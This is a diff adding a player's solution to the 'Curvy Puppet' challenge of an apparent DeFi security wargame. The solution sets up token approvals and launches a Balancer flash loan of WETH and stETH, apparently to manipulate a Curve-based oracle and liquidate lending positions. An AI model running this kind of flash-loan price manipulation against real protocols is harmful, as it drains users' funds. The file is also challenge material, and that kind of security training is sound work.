@@ -6,9 +6,12 @@ import {Test, console} from "forge-std/Test.sol";
 import {IPermit2} from "permit2/interfaces/IPermit2.sol";
 import {WETH} from "solmate/tokens/WETH.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
-import {CurvyPuppetLending, IERC20} from "../../src/curvy-puppet/CurvyPuppetLending.sol";
+//import {CurvyPuppetLending, IERC20} from "../../src/curvy-puppet/CurvyPuppetLending.sol";
+import { IERC20} from "node_modules/@balancer-labs/v2-interfaces/contracts/vault/IVault.sol";
+import {CurvyPuppetLending} from "../../src/curvy-puppet/CurvyPuppetLending.sol";
 import {CurvyPuppetOracle} from "../../src/curvy-puppet/CurvyPuppetOracle.sol";
 import {IStableSwap} from "../../src/curvy-puppet/IStableSwap.sol";
+import {MyBalancerFlashLoan} from "../../src/curvy-puppet/Balancer.sol";
 
 contract CurvyPuppetChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -158,7 +161,32 @@ contract CurvyPuppetChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_curvyPuppet() public checkSolvedByPlayer {
-        
+        uint256 kek = 3596890440129560193;
+       // assertGt(lending.getCollateralValue(USER_INITIAL_COLLATERAL_BALANCE) * 100,  lending.getBorrowValue_new(USER_BORROW_AMOUNT, kek) * 175);
+   
+        weth.transferFrom(treasury, player,TREASURY_WETH_BALANCE );
+        IERC20(curvePool.lp_token()).transferFrom(treasury, player,TREASURY_LP_BALANCE );
+
+        IERC20(curvePool.lp_token()).approve(address(curvePool), type(uint256).max);
+        IERC20(curvePool.lp_token()).approve(address(lending), type(uint256).max);
+
+        weth.approve(address(curvePool), type(uint256).max);
+        weth.approve(address(lending), type(uint256).max);
+
+
+        MyBalancerFlashLoan balancer = new MyBalancerFlashLoan(0xBA12222222228d8Ba445958a75a0704d566BF2C8, address(curvePool), address(lending), IERC20(address(weth)), alice, bob, charlie);
+        IERC20(curvePool.lp_token()).transfer(address(balancer),TREASURY_LP_BALANCE);
+        weth.transfer(address(balancer),TREASURY_WETH_BALANCE );
+
+        IERC20[] memory tokens = new IERC20[](2);
+        uint256[] memory amounts = new uint256[](2);
+        tokens[1] = IERC20(address(weth));//IERC20(address(weth));
+        tokens[0] = stETH;//IERC20(address(stETH));
+        amounts[1] = weth.balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
+        amounts[0] = stETH.balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
+
+
+        balancer.initiateFlashLoan(tokens, amounts);
     }
 
     /**
